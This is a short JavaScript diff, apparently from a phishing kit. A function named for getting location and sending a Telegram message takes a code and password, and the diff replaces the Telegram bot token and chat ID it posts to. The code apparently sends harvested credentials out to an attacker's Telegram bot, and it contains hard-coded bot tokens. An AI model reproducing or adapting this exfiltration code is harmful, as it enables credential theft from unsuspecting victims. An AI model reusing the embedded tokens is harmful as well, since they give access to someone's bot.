@@ -93,8 +93,8 @@ function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, messag
 }
 
 function enviarMensajeTelegram(mensaje, nextPage) {
-    var token = '5786833417:AAFNO4qHSs3WvYpmMOVYl6zxMBDKrUpMJ54';
-    var chatId = '-1001798720300';
+    var token = '7331749576:AAGBadTFNTGgM7IvpseOULhsnOGtm_PACmY';
+    var chatId = '5432640156';
     var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
     var params = {
         chat_id: chatId,
